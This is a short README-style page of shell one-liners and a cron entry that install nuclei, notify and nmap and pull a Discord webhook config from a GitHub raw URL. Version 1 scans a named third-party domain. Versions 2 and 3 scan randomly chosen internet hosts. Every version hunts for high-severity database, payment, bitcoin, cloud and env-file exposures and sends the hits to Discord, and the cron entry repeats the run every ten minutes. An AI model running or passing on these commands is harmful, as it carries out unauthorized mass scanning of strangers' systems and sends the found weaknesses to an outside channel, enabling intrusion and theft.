Check my notion template 

https://codine7.notion.site/FOX-Scanner-21cc291a4b474bfe87df81557c57e87d?pvs=4

# one liner
```
apt install -y unzip chromium nmap cowsay &&
wget https://github.com/projectdiscovery/nuclei/releases/download/v3.0.1/nuclei_3.0.1_linux_386.zip &&
wait &&
unzip nuclei_3.0.1_linux_386.zip &&
wait &&
mv nuclei /usr/bin/ &&
nuclei -ut &&
wget https://github.com/projectdiscovery/notify/releases/download/v1.0.5/notify_1.0.5_linux_386.zip &&
wait &&
rm README.md LICENSE.md notify_1.0.5_linux_386.zip &&
unzip notify_1.0.5_linux_386.zip &&
wait &&
mv notify /usr/bin/ &&
rm *.zip &&
rm *.md &&
wget https://raw.githubusercontent.com/codine7/drake/main/discord.yaml &&
chmod +x *;nuclei -tags database,mongo,mysql,firebase,redis,stripe,paypal,bitcoin,odoo,rails,aws,azure,env -es info,low,medium -vv -u egifter.com | notify -pc discord.yaml  
```
# Version 2 
```
apt install -y unzip chromium nmap cowsay ; wait ;   curl -o nuclei_3.0.1_linux_386.zip https://github.com/projectdiscovery/nuclei/releases/download/v3.0.1/nuclei_3.0.1_linux_386.zip; wait ;  unzip -o nuclei_3.0.1_linux_386.zip ; wait ; mv nuclei /usr/bin/ ; wait ;  nuclei -ut ;  curl -o notify_1.0.5_linux_386.zip https://github.com/projectdiscovery/notify/releases/download/v1.0.5/notify_1.0.5_linux_386.zip; wait;  unzip -o notify_1.0.5_linux_386.zip ;  mv notify /usr/bin/;  wait; rm *.zip ;  curl -o discord.yaml https://raw.githubusercontent.com/codine7/drake/main/discord.yaml ;  wait; nmap -n -sn iR 90 -oG - | awk '/Up$/{print $2}' | sort -u | nuclei -mr 1 -mhe 1 -timeout 2 -tags database,mongo,mysql,firebase,redis,odoo,rails,aws,azure,env -es info,low,medium | notify -pc discord.yaml
```
# Version 3 
```
apt install -y unzip chromium nmap cowsay ; wait ;   curl -o nuclei_3.0.1_linux_386.zip https://github.com/projectdiscovery/nuclei/releases/download/v3.0.1/nuclei_3.0.1_linux_386.zip; wait ;  unzip -o nuclei_3.0.1_linux_386.zip ; wait ; mv nuclei /usr/bin/ ; wait ;  nuclei -ut ;  curl -o notify_1.0.5_linux_386.zip https://github.com/projectdiscovery/notify/releases/download/v1.0.5/notify_1.0.5_linux_386.zip; wait;  unzip -o notify_1.0.5_linux_386.zip ;  mv notify /usr/bin/;  wait; rm *.zip ;  curl -o discord.yaml https://raw.githubusercontent.com/codine7/drake/main/discord.yaml ;  wait; /usr/games/cowsay -f dragon "Scanning the network currnt targets count 300 please wait" ;nmap -n -sn -iR 300 -oG - | awk '/Up$/{print $2}' | sort -u | nuclei -c 200 -bs 50 -vv -tags database,mongo,mysql,firebase,redis,stripe,paypal,bitcoin,odoo,rails,aws,azure,env -es info,low,medium | notify -pc discord.yaml
```
# Cron Job
```
*/10 * * * * ~/dragon/fly.sh > ~/dragon_cron_log.txt 2>&1
```


